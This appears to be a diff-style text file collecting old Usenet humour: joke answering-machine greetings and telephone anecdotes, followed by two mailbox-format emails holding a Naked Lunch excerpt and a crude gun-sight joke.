+"This is David.  Talk."
+
+------------------------------------------------
+"Hi.  This is David.  I've shut the ringers off on my phones and taken a
+sedative.  As soon as I finish this recording I'm going to bed indefinitely.
+When I wake up I'll play my messages.  Please leave one."
+
+------------------------------------------------
+[with a kazoo band playing "Thus Spake Zarathustra" in the background...]
+"Thinking you were making an ordinary phone call, you have instead
+reached..." [YA-DAAAAAAAAA!] "...the ANSWERING MACHINE!  Leave your name
+and number, and we will get back to you as soon as we can."
+
+------------------------------------------------
+"Hello, this is Dr. Pangloss.  If this were the best of all possible worlds,
+I could come to the phone right now, but I can't, so if you could leave your
+name and number..."
+
+------------------------------------------------
+     "Hello?" <pause for a few seconds> "Sorry, he's not here right now,
+but if you leave a message, he'll get back to you."
+
+------------------------------------------------
+(woman taped off a "phone sex" service)
+
+WOMAN : (seductively) Hi.  I'm Linda.  You know, it can be really lonely
+when you're a fashion model.  Sometimes I just have to ...
+
+YOU : (interupting) Oh cmon, Linda, give me the damn phone..
+(then ask for a message)
+
+------------------------------------------------
+Just after the earthquake a friend of mine put on his answering machine:
+
+     "Hi, this is Jeff.  We can't get to the phone right now because we
+were killed in the Earthquake.  Tragic, isn't it?  But, leave a
+message anyway, someone is sure to get it eventually."  BEEP
+
+My favorite post quake message:
+
+    "Hi, we're not in cause we're out LOOTING!
+     Leave a message and we'll call you back and tell you what we got."
+
+------------------------------------------------
+"Hello, I'm not hear right now.  In fact, I'm out getting a new parakeet.
+ If you leave a message after the beep, I'll be sure to get back to you.
+ Oh, and by the way, a word of advice; never try to clean a parakeet cage
+ with a vacuum cleaner."
+
+------------------------------------------------
+Ring...click....(sound of loud music in background)...Hello? - just
+a second while I turn the stereo off (sound of person running to
+click off music, which gets quiet.  sound of person running back
+to phone) OK, sorry about that, hi there, who's this...well hi!...
+uh huh...yeah...well listen you're talking to a machine, so please
+leave a message and I'll call you back.
+
+(this ran for a while until a friend threatened to kill us after
+she said she had a 2 minute conversation with the machine.)
+
+------------------------------------------------
+     I worked for a bit in the coastguard in Wales and I used to send weather
+reports to other bases, using a sort of antique FAX machine. I would call
+first on a special telephone and then send the data. They used to answer the 
+phone with:
+    " Epicentre of the Universe, God speaking."
+    " Hartland home for lost whores."  (that was Hartland CG) 
+    " Da, zis iz Ivan: do you have zee secret information, Boris?"
+    " Pentagon command: transmit destruct sequence (pause) sequence correct:
+        T minus one minute and counting"
+     And then there was one phone we didn't use, with a number one off that of 
+the local take-out.  With my, non-British, accent I had some great fun with 
+that phone.
+     "Starship Enterprise, Uhura here, can you hold please?  -- Captain, there 
+is a transmission coming in on hailing frequency seven, do you want it on 
+screen?" (silence...click)
+     "Van
+couver coastguard, may I help you."  British long distance rates are
+phenomenonal and I had this poor dude sputtering with horror that he had 
+managed to make a long distance call by dialing five digits.
+
+------------------------------------------------
+A friend was at a mutal friend's sister's house, and when she went out for
+beer, he changed her answering machine message.  In a loud, deep, gravely,
+horror-film voice he recorded, "HI, THIS IS KATHY, I'M NOT MYSELF RIGHT NOW.
+IF YOU LEAVE YOUR NAME AND NUMBER, I'LL GET BACK TO YOU WHEN I'M FEELING
+BETTER."
+
+------------------------------------------------
+        Hi this is <name>. I'm sorry I can't answer the phone right now.
+        Leave a message and then wait by the phone until I call you back.
+
+------------------------------------------------
+In the background can be heard Gregorian Chant or some other church music
+<In a soft voice> Good Day My child, you have reached {name} dial a confession.
+At the tone if you will leave your name, number and short confession I will get
+back to you with your pennance. Thank you and may God go with you. <Beep>
+
+------------------------------------------------
+"Steve has been captured by a flying saucer and can't come to the phone
+right now, but if you leave your name, phone number, and a message I'll
+have him call you back as soon as he gets away.  Read all about it in
+next week's National Enquirer."
+
+------------------------------------------------
+"Steve is reassembling Elvis' brain and can't come to the phone right
+now, but if you leave your name ...", etc.
+
+------------------------------------------------
+(Annoying flute music in background)
+Good day, Jim.  Your contact, [insert name], is not available right now.
+Your mission, should you choose to accept it, is to leave your name, 
+number, and a brief message at the tone.  This tape will self-destruct
+in thirty seconds.
+Good Luck, Jim.
+
+------------------------------------------------
+A friend of mine at school has this message, read by three people while
+the STAR TREK theme plays in the background.
+     1:  Room 17, the final frontier.
+     2:  These are the messages of Chad's answering machine.  Its 2 semester
+         mission:  to seek out your name and your telepohne number.
+     3:  To boldly inform you to wait for the tone.
+
+------------------------------------------------
+        "Finally get an answering machine. Now how does this thing work? Hmmm.
+Press record button, I did that, and the light should be on. I wonder why it's
+not working right. Hmmmm, I wonder what this button does......"
+
+------------------------------------------------
+        "This is (#include phone.addr). We are not ... excuse me a moment,
+please. Put your sister down. PUT YOUR SISTER DOWN! (sound of window breaking)
+Great! What a mess. I'll have to get back to you later."
+
+------------------------------------------------
+"Hello.  I'm David's answering machine.  What are you?"
+
+------------------------------------------------
+Steve:  Hello.  Steve and Matt aren't here right now but if...
+Matt:  Steve, what are you doing?
+Steve:  I'm leaving a phone message since we aren't here.
+Matt:  But you left the last one -- it's my turn.
+Steve:  No, I'm sure it's my turn.
+Matt:  No, you're incorrect.  It's definitely my turn.
+Steve:  You fool.  I know it's ... wait ... Matt ... what are you doing
+        with that frying pan?!?
+  BONK [really loud thud]
+Matt:  Steve is out right now, so please leave your name and number.
+
+------------------------------------------------
+[imitating Mr. Rogers]
+"Hello.  I'm in the Magic Kingdom right now, so I can't come to the phone.
+Can you leave your name and number when you hear the sound of the tone?
+Sure...I knew you could." <BEEP>
+
+------------------------------------------------
+[imitating Ensign Chekov]
+"Oh, sair...it was *Khan*!  He made us say things...do things...he
+kept us from answering the phone!  But Keptin was strong, and if you
+leave your name and number, Keptin will get back to you as soon as
+he can!"  <BEEP>
+
+------------------------------------------------
+"You have reached the <city>,<state> Strategic Air Command Nuclear
+Missle Storage Facility.  We are unable to come to the phone right
+now.  At the tone, please leave you name, number and target or list of
+targets and we'll launch as soon as we can.  And have a nice day."
+
+------------------------------------------------
+"We are unable to come to the phone right now.  At the tone, please
+leave your name, number, and Master Card, Visa, or American Express
+account number and we'll get back to, pending credit approval."
+
+------------------------------------------------
+ "Hello, this is Jim. Unfortunately I can't answer the phone right now
+  because I've just come back from the Mirror Worlds and I'm still made 
+  up of antimatter, so if I were to pick up the phone right now, the 
+  resulting energy release would make Hiroshima look like a wet firecracker.
+  So leave a message at the tone and I'll get back to you as soon as my
+  component particles have been restored to their normal charges."
+
+------------------------------------------------
+ "Speak, worm!" <beep>
+  Works best if done in a Darth Vader voice.
+
+------------------------------------------------
+ "You know what to do at the tone." <beep>
+
+------------------------------------------------
+ "Hello?" <beep>
+  This confuses anyone who doesn't know you.
+
+------------------------------------------------
+ "Hello, I'm not here." <beep>
+  A friend of mine used this one last summer. I always answered it with
+  "Okay, that's all I wanted to know."
+
+------------------------------------------------
+   Hi!! You've reached Janet and Chris's room. We're not in right now.
+If this is our parents, we're at the library studying. Yeah, yeah,
+that's it, that's the ticket. If this is John (Chris's boyfriend), Chris
+is out with the girls at the party. Yeah, that's it. If this is any one
+else, we're at a party and you're not. Yeah, a party with the president.
+Yeah and the .... pope. Yeah that's it. <beep>
+
+------------------------------------------------
+One voice:  I didn't expect an answering machine.
+
+Another voice: 
+           Nobody expects an answrering machine.
+           Our chief use is to get your name. And phone number.
+           Our two chief uses are to get your name and phone number. And
+               message.  (damn)
+           Our three uses are to get your name, phone number, and
+               message.   And time you called.
+           Oh, damn, we'll have to start over. No--no time for that, so
+               just wait for the beep. 
+
+------------------------------------------------
+(in an Italian mafia-style tone:)
+"Hello.  I can't come to the phone right now.  Me and Guido are trying to
+ stuff a body in the trunk.  I think we're going to have to size it a
+little... <aside> HEY GUIDO! GET THE CHAINSAW!  Anyways, leave your name
+and a message.  If I like it, you'll hear from me.  If not, _you'll_hear_
+from_Guido! ( a little laughter )...  "
+------------------------------------------------
+(To the tune of "Heartbreak Hotel" with appropriate instrumental accompaniment)
+I just left home baby
+I'll be out fer a spell
+and if you don't leave a message baby
+you can go to <BEEP>
+
+------------------------------------------------
+Hello, this is <insert your name here>.  I'm home right now, and in
+a few moments, I'll have a decision to make.  
+BEEEP!
+
+------------------------------------------------
+        [Theme from "Indiana Jones" in the background.]
+        You've reached the residence of John and Tom.  We can't
+        come to the phone right now, because we're cleaning the
+        refrigerator.  Please leave your name and number, and
+        we'll get back to you.
+        [Theme from "Indiana Jones" continues until the beep.]
+
+------------------------------------------------
+Hi!  John's answering machine is broken.  This is his
+        refrigerator.  Please speak very slowly, and I'll stick
+        your message to myself with one of these magnets.
+
+------------------------------------------------
+One of my favorites had this very exciting scary music, along with a
+kitten crying in the background, and the voice goes:
+
+The machine answering this message is connected to a 5000 volt power
+supply, and a relay which is wired to this small kitten.  If you hang up
+before you leave a message, it will complete the circuit and will fry
+the kitty.  The choice is YOURS....   BEEEEEEEEEEEEEEEEP
+------------------------------------------------
+FOXTROT-LIMA-ALPHA-SIERRA-HOTEL.  KEY-DESTRUCT-SEQUENCE-NOW.
+THIS-TERMINAL-ALSO-ACCEPTS-VOICE-MESSAGES......         ~~~
+
+------------------------------------------------
+        Thank you for calling the Metropolitan Church of the Holy Bible.
+        Today's commandment is Number 6, Thou shalt not...  er...  bear
+        a...  er...  shalt not witness thy...  uh...  neighbor's ass,
+        oh, I mean, false...  er...  shalt not commit a bear...  dern...
+
+------------------------------------------------
+        How do you leave a message on this thing?  I can't understand
+        the instructions.  Hello.  Testing 1 2 3.  I wonder what happens
+        if I touch this... YOW!!
+------------------------------------------------
+        I can't come to the phone now, so if, well, actually, I CAN come
+        to the phone now, I mean, like, I'm at the phone NOW, recording
+        this message, but I'm doing this NOW, while you're listening to
+        it LATER, except for you I guess it's NOW, like, when you're
+        listening to it...  I mean, like, wait, gosh.  This is so
+        confusing.
+------------------------------------------------
+        I can't come to the phone now, so...  hey -- that's a nice phone
+        you have there.  Hey sugar, you call this number often?  I bet
+        you have answering machines bothering you all the time...  yes
+        indeedy.  Why don't you give me a call sometime and we can
+        listen to some old recordings...  I might even play my beep for
+        you...
+
+------------------------------------------------
+        Don't you do it!  Don't you dare!  I don't want to hear it!
+        Don't you beep!  If you beep, I'll...  don't even think about
+        it!...  Don't...!
+
+------------------------------------------------
+        After the tone, leave your name, number, and tell where you left
+        the money.  I'll get back to you as soon as it's safe for you to
+        come out of hiding.
+
+------------------------------------------------
+        Prepare for alpha test of Beep Software revision 1.05.  Counting
+        down to test:  5...  4...  3...  2...  1...
+
+------------------------------------------------
+        As the drugs take hold, you feel you are losing your grip on
+        reality.  You begin to hallucinate.  You see a telephone...  the
+        telephone is next to an answering machine...  you hear a faint
+        click and a light flashes on the answering machine...  you hear
+        a beep...
+
+------------------------------------------------
+        You're growing tired.  Your eyelids are getting heavy.  You feel
+        very sleepy now.  You are gradually losing your willpower and
+        your ability to resist suggestions.  When you hear the tone you
+        will feel helplessly compelled to leave your name, number, and a
+        message.
+
+------------------------------------------------
+        No!  NO!  Not THAT!  Anything but that!  Not the beep!  No!
+        Please!  Not the beep!  Anything but the beep!
+        AAAAIIIIEEEEEEEEEEEE!
+------------------------------------------------
+        This is a test.  This is a test of the Answering Machine
+        Broadcast System.  This is only a test.
+
+------------------------------------------------
+        Next on Public Radio 91 we'll be hearing music of Antonin
+        Dvorak.  This is the Beep Serenade in C-Sharp Minor, Opus 72...
+
+------------------------------------------------
+        [Sung to the tune of "Ride of the Valkyries"]
+        Leave a message...  leave a message...  etc.
+
+------------------------------------------------
+        Thanks for calling Dial-A-Shrink.  I can't come to the phone
+        right now, so after the tone, please leave your name and number,
+        then talk briefly about your childhood and tell me what comes to
+        mind when you hear the following words:  orange...  mother...
+        unicorn...  penis.  I'll get back to you with my diagnosis as
+        soon as possible.
+
+------------------------------------------------
+        [For Shakespeare lovers only]
+        So long as phones can ring and eyes can see,
+        So leave a message, and I'll get back to thee.
+
+------------------------------------------------
+        [VOICE 1]  Answer the phone, please, Hal.
+        [VOICE 2]  I'm sorry, Dave, I can't do that.
+
+------------------------------------------------
+        I can't come to the phone right now because I'm down in the
+        basement printing up a fresh new batch of 20 dollar bills.  If
+        you need any money, or if you just want to check out my
+        handiwork, please leave your name, number, and how much cash you
+        need after the tone.  If you're from the Department of the
+        Treasury, please ignore this message.
+
+------------------------------------------------
+        Thank you for calling the Confessional Hotline.  Father Durway's
+        not here right now, but if you'll leave your name, number, and
+        confession at the tone, he'll get back to you with absolution as
+        soon as possible.  And remember, confession doesn't count unless
+        you confess all of your sins in vivid, graphic detail!
+
+------------------------------------------------
+        Andy Warhol said that one day everyone will be famous for 15
+        minutes.  Well, your 15 minutes was last week, but since you
+        weren't ready, we gave it to Vanna White.  Sorry.
+
+------------------------------------------------
+        C'mon...  you can do it...  just a little one.  That's the
+        way...  just a little beep, just a little one.  C'mon...  good
+        boy...  here we go...  like this -- beeeeep, just a little one,
+        beeeeeeeeeep, c'mon...  There you go!
+
+------------------------------------------------
+        I can't come to the phone now because I have amnesia and I feel
+        stupid talking to people I don't remember.  I'd appreciate it if
+        you could help me out by leaving my name and telling me
+        something about myself.  Thanks.
+
+------------------------------------------------
+        I can't come to the phone now because alien beings are eating my
+        brain.  Leave a message anyway, and after the alien beings
+        assume my shape, one of them will get back to you.
+
+------------------------------------------------
+        Thanks for calling Dial-An-Asshole.  Right now, all our assholes
+        are busy.  After the tone, leave your name and number, and we'll
+        have an asshole return your call as soon as possible.
+
+------------------------------------------------
+Ok, One more time...
+This is our answering machine...
+This is the message on our answering machine...
+....Any questions?
+
+------------------------------------------------
+        Hi, can I speak to Mark?...Oh, there isn't?...I'm sorry,
+        I must have dialed the wrong number.
+
+------------------------------------------------
+        <beep, beep, beep>
+        The number you have reached,
+        Seven.  Six.  Seven.  One.  Two.  Three.  Four.
+        [Use your number here.]
+        has not been disconnected and is still in service.
+        Please leave a message at the sound of the tone.
+
+------------------------------------------------
+HANS: This is Hans
+
+FRANZ: And this is Franz, and we just want to...
+
+BOTH: Pump (CLAP) you up
+
+HANS: But we are not at home, you know
+
+FRANZ: Ya, we are gone
+
+HANS: If you want us to...
+
+BOTH: Pump (CLAP) you up
+
+HANS: You will leave a message after the beep
+
+FRANZ: If you don't leave a message, then you are Girlyman.
+
+HANS: Ya, Girlyman.  And we don't talk to Girlyman, you know
+
+FRANZ: So leave a message and we will call to..
+
+BOTH: Pump (CLAP) you up 
+
+------------------------------------------------
+"Hello!  This is 1-800-PRESLEY -- Yes!  1-800-PRESLEY!
+
+They say the King died 10 years ago, but we know he's still out there
+somewhere.  So . . . leave your name and number and tell us where
+*YOU* saw Elvis!"
+
+------------------------------------------------
+       "Hi, you've reached 1-900-CALL-BREN, my personal message line where
+        you can talk to me, Bren.  I'll tell you all about how I'm suffering 
+        in between sports seasons and about my part time hobby of being a 
+        power forward for the Portland Trailblazers.  I'll tell my deepest 
+        secrets, such as my desire to be kidnapped by short blonde sorority
+        girls wearing short jean skirts, and you can decide whether or not
+        I'm wearing pants.  Selected callers will get to talk to me live.
+        Since you're not one of them, leave your own personal secret at the
+        beep. "
+
+------------------------------------------------
+ In a vaguely phoneco-operator voice: "I'm sorry, you have reached an
+imaginary number. Would you please rotate your telephone by ninety
+degrees and try your call again."
+  
+   A few people even got the joke...
+
+------------------------------------------------
+"You have just dialed into the North American Air Defense Contract Center.
+Stand by at the tone to give coordinates and destination of incoming bogey.
+TNR Surveillance will scramble. If you do not respond, this unit will assume
+incoming, non-important."
+
+------------------------------------------------
+"Sherwood forest, which dear do you want?"
+
+"Lucifer speaking, who in the hall do you want?"
+
+"Heaven, God speaking."
+
+"Bridge, Kirk here."
+
+ "City Morgue, you kill 'em, we chill 'em; You stab 'em, we slab 'em!"
+
+------------------------------------------------
+"Thank you for calling Soviet Embassy.  No KG... Er, no diplomats are
+able to answer phone, so at sound of capitalist tone, leave name,
+telephone number, and short description of secrets you wish to sell."
+
+------------------------------------------------
+"I've set up my answering machine so that when anyone calls, they
+   here a busy signal."
+
+------------------------------------------------
+If you are a burgler, then we are probably at home but can't come
+        to the phone right now
+Otherwise, we probably aren't at home.
+
+------------------------------------------------
+The number you've dialed is purely imaginary, multiply by i and dial again!
+
+------------------------------------------------
+     This is you-know who.
+     We are you-know-where.
+     Leave your you-know-what you-know-when.
+
+------------------------------------------------
+    " I'm Morley Safer."
+    "I'm Harry Reasoner."
+    "I'm ........
+    "And I'm" <the guy whose answering machine it was>
+    " We're not home; leave a message."
+
+      He had taped the audio of the beginning of 60 minutes; it sounded
+    very funny.
+
+------------------------------------------------
+"Greetings.  You've reached Ghengis Kahn's Pornographic Films 
+Unlimited.  Fabian, Pat, Rex and Mike are still conducting screen 
+tests with potential leading ladies to star opposite the late John 
+Holmes in our upcoming feature film "It's Not the Size That Counts but 
+Whether or Not You're Alive to Use It."  If you're interested in a
+screen test, or even if you're not, please leave us your name, age,
+phone number, measurements, cup size, a brief summary of your work
+experience, both off and on the screen, and a brief summary of your
+favorite fantasy involving four men, a pair of handcuffs, and a tub of
+Cool Whip.  Thank you for calling." 
+
+------------------------------------------------
+Another one I've done more than once is to slowly increase the pitch
+and speed of my voice while recording the message to make it sound
+like the machine is broken: 
+
+(start, low pitch, slow)
+"Hhhhheeelllllloooooo thheeeerrrrrrre evvvvveerrrryyyboooodyyyy....
+
+(middle, normal)
+...home of Veronica, Jaw-Chyi, Mark and Mike. Nobody's home...
+
+(later, high pitch, fast)
+...butifyou'dliketoleaveamessageafterthetonethen...
+
+(end, incomprehensible chipmunk gibberish)
+...kkfjdkeirucjkljfkldjrioutjkjfdskoreudjfkleqBEEP!"
+
+------------------------------------------------
+        This is not an answering machine -- this is a telepathic
+        thought-recording device.  After the tone, think about your
+        name, your reason for calling, and a number where I can reach
+        you, and I'll think about returning your call.
+
+------------------------------------------------
+    "E'llo."
+    "My name is Inigo Montonya."
+    "You killed my father."
+    "Leave your name and number, and prepare to die."  
+    <beep>
+
+------------------------------------------------
+My favorite that I have heard as an answering machine message is also
+>from this movie.  My friend recorded the section that goes something
+like:
+
+        "I'm writing the definative work on pain, and I would like you
+to tell me how the machine makes you feel.  Remember, be honest.  This
+is for posterity."
+
+------------------------------------------------
+The message I currently have on my recorder is the output from my Amiga's
+speech sythesizer.  It's set up as a dialog between two distict, but
+recognizably artificial voices.  I thought it sort of mediocre myself, but
+have gotten quite a number of amused comments about it.
+-----
+1> Hello, there are no real people here to answer the phone right now.
+
+2> Yeah, nobody but us machines!
+
+1> Right, just us machines, but don't hang up!  If you like, you can leave
+   your name and telephone number...
+
+2> ...and a message!  You forgot about the message!
+
+1> Right.  Leave your name, telephone number, and a brief message after you
+   hear the beep, and we will keep track of this stuff until the real people
+   get back.
+
+2> ...unless of course, sombody pulls out our plug!
+
+------------------------------------------------
+I taped theoperator saying "we're sorry.  The number you have reached
+has been disconnected or is no longer is service..."
+
+------------------------------------------------
+ From Halloween this year:
+
+        (Ominous electronic background music.)
+
+        Hi, this is Jim. In honor of Halloween, I'm about to perform
+        an unspeakable pagan ritual. So please leave a message. Oh,
+        unless you're a virgin, in which case, why don't you stop by?
+        SINT MIHI DEI ACHERONTIS PROPITII...
+
+------------------------------------------------
+
+        (French monologue in the background)
+
+        Around the world today, millions still speak French as either
+        a first or second language. But with your continued support
+        and help, we can wipe out French in our lifetime. Please leave
+        a message in English at the tone, and remember, if someone
+        tries to speak French to you, just say, "non".
+
+------------------------------------------------
+
+        Hi, this is Jim. Welcome to my Fun Phone Line, where you can
+        talk to my answering machine for only $.95 per minute! Please
+        leave your credit card number at the tone...
+
+------------------------------------------------
+
+        Hi, this is Jim. Thanks for calling during my spring pledge
+        drive. A basic membership is only $30, and a $60 pledge gets
+        you an "I love Jim Shea" T-shirt. Please wait for the tone,
+        and thank you for your pledge.
+
+------------------------------------------------
+
+(click) "You have reached the CPX-2000 Voice Blackmail System.  Your
+        voice patterns are now being digitally encoded and stored for
+        later use.  Once this is done, our computers will be able to
+        use the sound of _your_ voice for literally thousands of illegal
+        and immoral purposes.  There is no charge for this initial
+        consultation, however our staff of professional extortionists
+        will be contacting you in the near future to further explain the
+        benefits of our service, and to arrange for your schedule of
+        payment.  Remember to speak clearly at the sound of the tone.
+        Thank you."  (BEEEEEEEEEEEP)
+
+==================
+PHONE ANNECDOTES:
+==================
+
+>From bateman@Iago.Caltech.Edu Tue May  1 12:52:59 1990
+
+Message: Hi this is Craig's car phone.  Craig's at home now, so you can try
+calling him there or leave a message after the beep.
+
+Caller's message:  Hmmm.  Car phone!?!  I'll call back later when your out.
+
+                                                 -Koris Goudonov
+------------------------------------
+
+Every now and then we are all pestered by these high-tech telemarketing
+companies where the sales pitch is usually disguised as a survey of some kind.
+The despicable thing about these things is that they won't leave you
+alone. If you hang up, they will just call back again.
+ 
+One day my wife got a call from one of these computer systems, and her
+answering machine answered. The conversation that followed was
+hilarious, as it consisted of two machines talking to each other
+without having the slightest idea about what each other was saying.
+The conversation wound up in an endless loop, as follows:
+ 
+[PHONE] *RING*
+ 
+[ANSWERING MACHINE] "...At the tone, please give your message.
+BEEEEEP."
+ 
+[PHONE] "Hello. This is [company_name], and we are taking a telephone 
+survey ... when I ask a question, wait for the beep, then please
+speak plainly.  I will repeat your answer back to you, and verify it.
+First, what is your phone number? BEEEEEEEEEEEEEP."
+ 
+(The answering machine, upon hearing the beep, got confused and thought
+ 
+it was a play-back command, and generated another beep in response.)
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP."
+ 
+[PHONE] "Thank you! Your phone number was 443-28347-47756-377764-22222.
+Is that correct? BEEEEEEEEEEEEEEEP."
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP."
+ 
+[PHONE] "Thank you! Do you have any children? BEEEEEEEEEEEEEP."
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP."
+ 
+[PHONE] Thank you! What is the age of your first child? BEEEEEEEEEEP."
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP."
+ 
+[PHONE] "Your first child is 1,222 years old. Is that correct?
+BEEEEEP."
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP."
+ 
+[---------------  BEGIN ENDLESS LOOP ----------------]
+ 
+[PHONE] "Thank you! Do you have any more children? BEEEEEEP."
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP." 
+ 
+[PHONE] "Thank you! What is this child's age? BEEEP." 
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP." 
+ 
+[PHONE] "This child is 4,233 years old. Is that correct? BEEEEP."
+ 
+[ANSWERING MACHINE] "BEEEEEEEEEEEEEEEP." 
+ 
+[---------------------END LOOP -----------------------]
+ 
+My wife, upon noticing that the answering machine had been going for
+over half an hour, turned up the volume to find out what was going on.
+When she discovered this endless loop (by now she had over 200 children,
+all over 1,000 years old), she switched off the answering machine. The
+computer never called again.
+
+----------------------------------------------------
+     I had a friend who liked to play with the phones.  He got his girlfriend
+to sound like an operator and make a tape saying:
+     "I'm sorry, the number that has dialed you is not in service.  Will
+      you please hang up and let it dial again...<crackle> I'm sorry, the..."
+     He had a lot of fun calling people up and playing it.
+
+----------------------------------------------------
+I once answered the phone as follows.
+" San Luis Obispo Police, Sergeant McCallahan here, may I help you?"
+After about five seconds of dead air, I heard a click.  About five minutes
+later, the phone rang again.  This time my roomate answered.  It was the same
+person that had called a few minutes earlier.  It turned out that the long 
+delay between calls was due to the fact that he had to mooch a quarter for his
+next call.  He was at a public phone booth and had used his last quarter to
+call us.  I don't think he talked civil to me for a week...
+
+----------------------------------------------------
+     My grandmother had been bothered by calls coming in after midnight,
+waking her, and forcing her out of bed and across the house to answer. 
+Invariably, they were from the same man, seemingly slightly intoxicated, 
+with bar-crowd noises in the background. He wanted to speak to Peggy, 
+whoever that was, and my grand mother would tell him there was no Peggy 
+living there, and that he must have the wrong number. But he wouldn't 
+believe her, and kept insisting, begging, pleading, etc. to talk to 
+Peggy. My Grandmother would have to just hang up finally.
+     This went on for a few days, and late one night, when the phone rang,
+my Grandfather held back his wife, and said, "I'll take care of this", and
+got out of bed to answer the phone. The ensuing conversation was short and
+quick, and went something like this:
+     "Hello?"
+     "Hello, Can I speak to Peggy?"
+     "No, I'm sorry, she can't come to the phone right now-- she's nursing 
+the baby."
+
+----------------------------------------------------
+Here's my favorite, for calling large offices and idiots-in-general: 
+"Hello, is this the person to whom I am speaking?"
+
+----------------------------------------------------
+     My solution is upon realizing that I'm talking with a "telemarketing
+representative", I ask:  "Are you a telemarketer?"  The answer
+(suprisingly) is usually yes.  I then go into a sales pitch to
+sell a (nonexistant) telephone ear-cusion.
+     I insist that every telemarketer must have one for safety and comfort.
+     Eventually, they'll forget to try selling me anything.
+
+----------------------------------------------------
+A recent posting by Duke McMullan requested ways to repel telephone 
+solicitors.  My friend Pepe Tres from Texas told me this one and gave 
+permission to post it:
+     "My time is billed at $125 per hour.  To continue this 
+     conversation, I must have your MasterCard or Visa number, card 
+     type and date of expiration."
+Pepe says it usually leaves them speechless.  One guy replied, "Hey, 
+that's good; I'll have to remember it."  Once a supervisor of 
+telephone solicitors called back and asked him if he was "some kind of 
+high-powered lawyer."
+----------------------------------------------------
+
+Everybody gets and dials wrong numbers. It's good to be nice about it. What
+goes around comes around, right? so, I try to reassure the apologetic and
+embarrassed wrong dialers that will actually converse once the error is
+discovered, with it going something like this:
+
+caller w. wrong number: "Gee, I'm sorry..."
+me:                     "That's OK, I was going to pick up the phone anyway.."
+
+----------------------------------------------------
+How about the 'Fraudian Slip Answer'? Like this:
+
+<Whoever> here. What can I do to-----I MEAN-----FOR you?
+
+----------------------------------------------------
+Try the following next time the phone rings:
+
+You (when you answer):  Hello, is Jimmy there?
+
+Caller: No, I'm afraid you have a wrong number.
+
+You: Oh.  Sorry.
+
+Caller: No problem... (click)
+
+----------------------------------------------------
+From erica.busty@longlegs.com Tue Aug 13 13:00:56 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:56 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXw-0001rb-U7
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:56 +0200
+Subject: The asshole
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXw-0001rb-U7@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:56 +0200
+Status: O
+X-UID: 215
+
+Did I ever tell you about the man who taught his ass to talk? His whole
+abdomen would move up and down you dig farting out the words. It was
+unlike anything I had ever heard.
+
+"This ass talk had sort of a gut frequency. It hit you right down there
+like you gotta go. You know when the old colon gives you the elbow and it
+feels sorta cold inside, and you know all you have to do is turn loose?
+Well this talking hit you right down there, a bubbly, thick stagnant
+sound, a sound you could smell.
+
+"This man worked for a carnival you dig, and to start with it was like a
+novelty ventriliquist act. Real funny, too, at first. He had a number he
+called "The Better 'Ole' that was a scream, I tell you. I forget most of
+it but it was clever. Like, "Oh I say, are you still down there, old
+thing?'
+
+"'Nah! I had to go relieve myself.'
+
+"After a while the ass start talking on its own. He would go in without
+anything prepared and his ass would ad-lib and toss the gags back at him
+every time.
+
+"Then it developed sort of teeth-like little raspy in- curving hooks and
+start eating. He thought this was cute at first and built and act around
+it, but the asshole would eat its way through his pants and start talking
+on the street, shouting out it wanted equal rights. It would get drunk,
+too, and have crying jags nobody loved it and it wanted to be kissed same
+as any other mouth. Finally it talked all the time day and night, you
+could hear him for blocks screaming at it to shut up, and beating it with
+his fist, and sticking candles up it, but nothing did any good and the
+asshole said to him:  'It's you who will shut up in the end. Not me.
+Because we don't need you around here any more. I can talk and eat AND
+shit.'
+
+"After that he began waking up in the morning with a transparent jelly
+like a tadpole's tail all over his mouth. This jelly was what the
+scientists call un-D.T., Undifferentiated Tissue, which can grow into any
+kind of flesh on the human body. He would tear it off his mouth and the
+pieces would stick to his hands like burning gasoline jelly and grow
+there, grow anywhere on him a glob of it fell. So finally his mouth
+sealed over, and the whole head would have have amputated spontaneous-
+except for the EYES you dig. That's one thing the asshole COULDN'T do was
+see. It needed the eyes. But nerve connections were blocked and
+infiltrated and atrophied so the brain couldn't give orders any more. It
+was trapped in the skull, sealed off. For a while you could see the
+silent, helpless suffering of the brain behind the eyes, then finally the
+brain must have died, because the eyes WENT OUT, and there was no more
+feeling in them than a crab's eyes on the end of a stalk.
+
+Reprinted without permission from:
+The Naked Lunch
+William S Burroughs
+From admin@mofo.pwn Tue Aug 13 13:00:56 2019
+Return-path: <admin@mofo.pwn>
+Envelope-to: someuser@localhost
+Delivery-date: Tue, 13 Aug 2019 13:00:56 +0200
+Received: from root by nancy.mofo.pwn with local (Exim 4.92)
+        (envelope-from <admin@mofo.pwn>)
+        id 1hxUXw-0001rf-Ur
+        for someuser@localhost; Tue, 13 Aug 2019 13:00:56 +0200
+Subject: The raise
+From: admin@mofo.pwn
+To: <someuser@localhost>
+X-Mailer: mail (GNU Mailutils 3.5)
+Message-Id: <E1hxUXw-0001rf-Ur@nancy.mofo.pwn>
+Date: Tue, 13 Aug 2019 13:00:56 +0200
+Status: O
+X-UID: 216
+
+ This guy gets a raise, so he decides to but a new sight for his gun.
+Well, anyway, the salesman at the store is throwing his pitch, and he
+brags, "If you'll look through this sight, I'll bet that you can see my
+house in perfect detail, even though it's the whole way at the top of the
+hill."
+
+ So the guy looks through the sight, and says, "Yep, you're right... wait
+a minute... I can see some lady and a guy running around with no clothes
+on, too..."
+
+ Shocked, the salesman snatches the sight back, and looks through it.
+Sure enough, he sees the same thing.  Infuriated, the salesman hands the
+guy a gun and two bullets, and says,  "If you'll blow my cheatin' wife's
+head off, and that guy's dick off, you can have the sight for free."
+
+ The guy looks throught the sight again.  "You know, I think I can do that
+with only 1 bullet..."
